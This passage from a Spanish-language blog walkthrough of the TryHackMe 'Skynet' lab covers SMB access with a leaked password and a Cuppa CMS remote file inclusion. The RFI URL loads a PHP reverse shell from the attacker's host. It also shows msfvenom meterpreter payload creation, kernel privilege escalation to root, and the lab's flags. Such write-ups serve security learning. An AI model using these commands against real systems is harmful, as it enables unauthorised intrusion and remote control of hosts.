+<li>Reviso el correo y encuentro que se ha cambiado la contraseña de SMB</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Subject:   	Samba Password reset
+</span></span><span style="display:flex;"><span>From:   	skynet@skynet
+</span></span><span style="display:flex;"><span>Date:   	Tue, September 17, <span style="color:#ae81ff">2019</span> 10:10 pm
+</span></span><span style="display:flex;"><span>Priority:   	Normal
+</span></span><span style="display:flex;"><span>Options:   	View Full Header |  View Printable Version  | Download this as a file
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>We have changed your smb password after system malfunction.
+</span></span><span style="display:flex;"><span>Password: <span style="color:#f92672">)</span>s<span style="color:#f92672">{</span>A&amp;2Z<span style="color:#f92672">=</span>F^n_E.B<span style="color:#e6db74">`</span>
+</span></span></code></pre></div><ul>
+<li>Accedo con smbclient y descargo todo.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ smbclient //10.10.126.64/milesdyson -U milesdyson -c <span style="color:#e6db74">&#34;recurse; mget *&#34;</span>
+</span></span></code></pre></div><ul>
+<li>Reviso ficheros y encuentro uo llamado important.txt</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ cat important.txt
+</span></span><span style="display:flex;"><span>───────┬────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>       │ File: important.txt
+</span></span><span style="display:flex;"><span>───────┼────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>   │ 
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>   │ 1. Add features to beta CMS /45kra24zxs28v3yd
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>   │ 2. Work on T-800 Model <span style="color:#ae81ff">101</span> blueprints
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>   │ 3. Spend more time with my wife
+</span></span><span style="display:flex;"><span>───────┴────────────────────────────────────────────────────
+</span></span></code></pre></div><ul>
+<li>Accedo al CMS http://10.10.126.64/45kra24zxs28v3yd/</li>
+<li>Escaneo la URL con dirby y encuentro que aloja Cuppa CMS</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ dirb http://10.10.126.64/45kra24zxs28v3yd /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>DIRB v2.22    
+</span></span><span style="display:flex;"><span>By The Dark Raver
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>START_TIME: Sat Sep  <span style="color:#ae81ff">2</span> 12:48:28 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>URL_BASE: http://10.10.126.64/45kra24zxs28v3yd/
+</span></span><span style="display:flex;"><span>WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GENERATED WORDS: <span style="color:#ae81ff">4612</span>                                                          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---- Scanning URL: http://10.10.126.64/45kra24zxs28v3yd/ ----
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.126.64/45kra24zxs28v3yd/administrator/
+</span></span></code></pre></div><h3 id="paso-4">Paso 4</h3>
+<ul>
+<li>Busco exploits conocidos.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ searchsploit cuppa -w
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                                                              |  URL
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
+</span></span><span style="display:flex;"><span>Cuppa CMS - <span style="color:#e6db74">&#39;/alertConfigField.php&#39;</span> Local/Remote File Inclusion                                                                             | https://www.exploit-db.com/exploits/25971
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span></code></pre></div><ul>
+<li>El codigo permite incluir archivos PHP locales o remotos o leer archivos que no sean PHP con esta vulnerabilidad. Busco un reverse shell con php para usarlo.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ find /usr/share -iname <span style="color:#e6db74">&#34;php-reverse-shell.php&#34;</span> 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/usr/share/laudanum/php/php-reverse-shell.php
+</span></span><span style="display:flex;"><span>/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
+</span></span><span style="display:flex;"><span>/usr/share/webshells/php/php-reverse-shell.php
+</span></span></code></pre></div><ul>
+<li>Uso el exploit para cargar el fichero php en el objetivo despues de haber creado un listener.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://10.10.126.64/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig<span style="color:#f92672">=</span>http://10.x.x.x/php-reverse-shell.php
+</span></span></code></pre></div><h3 id="paso-5">Paso 5</h3>
+<ul>
+<li>Conexión reverse shell</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ rlwrap nc -lvnp <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1234</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.x.x.x<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.126.64<span style="color:#f92672">]</span> <span style="color:#ae81ff">43474</span>
+</span></span><span style="display:flex;"><span>Linux skynet 4.8.0-58-generic <span style="color:#75715e">#63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span style="display:flex;"><span> 06:02:14 up  2:06,  <span style="color:#ae81ff">0</span> users,  load average: 0.00, 0.00, 0.00
+</span></span><span style="display:flex;"><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+</span></span><span style="display:flex;"><span>$
+</span></span></code></pre></div><ul>
+<li>Estabilizo shell y busco flag del usuario.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>www-data@skynet:/$ cd
+</span></span><span style="display:flex;"><span>cd
+</span></span><span style="display:flex;"><span>bash: cd: HOME not set
+</span></span><span style="display:flex;"><span>www-data@skynet:/$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>bin   home	     lib64	 opt	sbin  tmp      vmlinuz.old
+</span></span><span style="display:flex;"><span>boot  initrd.img      lost+found  proc	snap  usr
+</span></span><span style="display:flex;"><span>dev   initrd.img.old  media	 root	srv   var
+</span></span><span style="display:flex;"><span>etc   lib	     mnt	 run	sys   vmlinuz
+</span></span><span style="display:flex;"><span>www-data@skynet:/$ cd home
+</span></span><span style="display:flex;"><span>cd home
+</span></span><span style="display:flex;"><span>www-data@skynet:/home$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>milesdyson
+</span></span><span style="display:flex;"><span>www-data@skynet:/home$ cd milesdyson
+</span></span><span style="display:flex;"><span>cd milesdyson
+</span></span><span style="display:flex;"><span>www-data@skynet:/home/milesdyson$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>backups  mail  share  user.txt
+</span></span><span style="display:flex;"><span>www-data@skynet:/home/milesdyson$ cat user.txt
+</span></span><span style="display:flex;"><span>cat user.txt
+</span></span><span style="display:flex;"><span>7ce5c2109a40f958099283600a9ae807
+</span></span></code></pre></div><h3 id="paso-6">Paso 6</h3>
+<ul>
+<li>Creo un payload con msfvenom para obtener acceso con meterpreter y lo subo con wget</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST<span style="color:#f92672">=</span>10.x.x.x LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">130</span> bytes
+</span></span><span style="display:flex;"><span>Final size of elf file: <span style="color:#ae81ff">250</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: shell
+</span></span></code></pre></div><ul>
+<li>En metasploit ejecuto:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; use linux/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 payload<span style="color:#f92672">(</span>linux/x64/meterpreter/reverse_tcp<span style="color:#f92672">)</span> &gt; set LHOST tun0
+</span></span><span style="display:flex;"><span>msf6 payload<span style="color:#f92672">(</span>linux/x64/meterpreter/reverse_tcp<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Payload Handler Started as Job <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>msf6 payload<span style="color:#f92672">(</span>linux/x64/meterpreter/reverse_tcp<span style="color:#f92672">)</span> &gt; 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.x.x.x:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">3045380</span> bytes<span style="color:#f92672">)</span> to 10.10.126.64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.x.x.x:4444 -&gt; 10.10.126.64:33592<span style="color:#f92672">)</span> at 2023-09-02 13:27:55 +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; sysinfo 
+</span></span><span style="display:flex;"><span>Computer     : 10.10.126.64
+</span></span><span style="display:flex;"><span>OS           : Ubuntu 16.04 <span style="color:#f92672">(</span>Linux 4.8.0-58-generic<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Architecture : x64
+</span></span><span style="display:flex;"><span>BuildTuple   : x86_64-linux-musl
+</span></span><span style="display:flex;"><span>Meterpreter  : x64/linux
+</span></span></code></pre></div><ul>
+<li>Ejecuto el exploit suggeter de metasploit.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; run post/multi/recon/local_exploit_suggester
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.126.64 - Collecting local exploits <span style="color:#66d9ef">for</span> x64/linux...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.126.64 - <span style="color:#ae81ff">186</span> exploit checks are being tried...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.126.64 - exploit/linux/local/bpf_sign_extension_priv_esc: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.126.64 - exploit/linux/local/cve_2021_3493_overlayfs: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.126.64 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.126.64 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.126.64 - exploit/linux/local/glibc_realpath_priv_esc: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.126.64 - exploit/linux/local/pkexec: The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.126.64 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.126.64 - exploit/linux/local/su_login: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.126.64 - exploit/linux/local/sudo_baron_samedit: The target appears to be vulnerable. sudo 1.8.16 is a vulnerable build.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.126.64 - exploit/linux/local/ufo_privilege_escalation: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running check method <span style="color:#66d9ef">for</span> exploit <span style="color:#ae81ff">63</span> / <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.126.64 - Valid modules <span style="color:#66d9ef">for</span> session 1:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">============================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">#   Name                                                                Potentially Vulnerable?  Check Result</span>
+</span></span><span style="display:flex;"><span> -   ----                                                                -----------------------  ------------
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1</span>   exploit/linux/local/bpf_sign_extension_priv_esc                     Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2</span>   exploit/linux/local/cve_2021_3493_overlayfs                         Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">3</span>   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                 Yes                      The target is vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">4</span>   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">5</span>   exploit/linux/local/glibc_realpath_priv_esc                         Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">6</span>   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">7</span>   exploit/linux/local/ptrace_traceme_pkexec_helper                    Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">8</span>   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">9</span>   exploit/linux/local/sudo_baron_samedit                              Yes                      The target appears to be vulnerable. sudo 1.8.16 is a vulnerable build.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">10</span>  exploit/linux/local/ufo_privilege_escalation                        Yes                      The target appears to be vulnerable.
+</span></span></code></pre></div><ul>
+<li>Uso el exploit <code>exploit/linux/local/bpf_sign_extension_priv_esc</code> <a href="https://www.rapid7.com/db/modules/exploit/linux/local/bpf_sign_extension_priv_esc/">https://www.rapid7.com/db/modules/exploit/linux/local/bpf_sign_extension_priv_esc/</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 payload<span style="color:#f92672">(</span>linux/x64/meterpreter/reverse_tcp<span style="color:#f92672">)</span> &gt; use exploit/linux/local/bpf_sign_extension_priv_esc
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>linux/local/bpf_sign_extension_priv_esc<span style="color:#f92672">)</span> &gt; set LHOST tun0
+</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span>&gt; tun0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/linux/local/bpf_sign_extension_priv_esc<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name     Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----     ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   COMPILE  Auto             yes       Compile on target <span style="color:#f92672">(</span>Accepted: Auto, True, False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   SESSION                   yes       The session to run this module on
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>linux/x64/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name   Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----   ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   LHOST  tun0             yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Auto
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>View the full module info with the info, or info -d command.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>linux/local/bpf_sign_extension_priv_esc<span style="color:#f92672">)</span> &gt; set SESSION <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>SESSION <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>linux/local/bpf_sign_extension_priv_esc<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Handler failed to bind to 10.x.x.x4444:-  -
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Handler failed to bind to 0.0.0.0:4444:-  -
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running automatic check <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;set AutoCheck false&#34;</span> to disable<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Writing <span style="color:#e6db74">&#39;/tmp/.UoAQEHbf&#39;</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">250</span> bytes<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Launching exploit ...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">3045380</span> bytes<span style="color:#f92672">)</span> to 10.10.126.64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up /tmp/.UoAQEHbf and /tmp/.cVeXOTD6D ...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>10.x.x.x:4444 -&gt; 10.10.126.64:33600<span style="color:#f92672">)</span> at 2023-09-02 13:36:02 +0200
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit completed, but no session was created.
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>linux/local/bpf_sign_extension_priv_esc<span style="color:#f92672">)</span> &gt; sessions <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 2...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid 
+</span></span><span style="display:flex;"><span>Server username: root
+</span></span></code></pre></div><ul>
+<li>Una vez obtengo acceso como root, busco la bandera.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; cd /root
+</span></span><span style="display:flex;"><span>meterpreter &gt; ls
+</span></span><span style="display:flex;"><span>Listing: /root
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode              Size  Type  Last modified              Name
+</span></span><span style="display:flex;"><span>----              ----  ----  -------------              ----
+</span></span><span style="display:flex;"><span>020666/rw-rw-rw-  <span style="color:#ae81ff">0</span>     cha   2023-09-02 10:55:49 +0200  .bash_history
+</span></span><span style="display:flex;"><span>100644/rw-r--r--  <span style="color:#ae81ff">3106</span>  fil   2015-10-22 19:15:21 +0200  .bashrc
+</span></span><span style="display:flex;"><span>040700/rwx------  <span style="color:#ae81ff">4096</span>  dir   2019-09-18 00:35:40 +0200  .cache
+</span></span><span style="display:flex;"><span>040755/rwxr-xr-x  <span style="color:#ae81ff">4096</span>  dir   2019-09-17 09:32:06 +0200  .nano
+</span></span><span style="display:flex;"><span>100644/rw-r--r--  <span style="color:#ae81ff">148</span>   fil   2015-08-17 17:30:33 +0200  .profile
+</span></span><span style="display:flex;"><span>100644/rw-r--r--  <span style="color:#ae81ff">33</span>    fil   2019-09-18 05:41:47 +0200  root.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; cat root.txt 
+</span></span><span style="display:flex;"><span>3f0372db24753accc7179a282cd6a949
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>Al no tener una guía paso a paso, he tenido que investigar un poco más de lo habitual. Aún así, la máquina es bastante sencilla y no he tenido problemas para resolverla. Sigue el mismo patrón que las máquinas de TryHackMe: enumeración, explotación y escalada de privilegios. Con un poco de paciencia y ganas, se puede resolver sin problemas. Las herramientas que he usado son las habituales: nmap, enum4linux, dirb, burp, metasploit, hydra, smbclient, msfvenom, etc. Una máquina muy recomendable y entretenida con ambientación de Terminator.</p>
+<h2 id="-hack-the-planet">(◕‿‿◕) Hack the planet!</h2>
+</div>
+</article>
+
+    
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/burp">#Burp</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/dirb">#Dirb</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/easy">#Easy</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/intruder">#Intruder</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/linux">#Linux</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/metasploit">#Metasploit</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/meterpreter">#Meterpreter</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/msfvenom">#msfvenom</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/privilege-escalation">#Privilege Escalation</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/smb">#SMB</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/tryhackme">#TryHackMe</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+
+<p><small>
+        2023 &copy; Licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution 4.0 International License</a>.
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
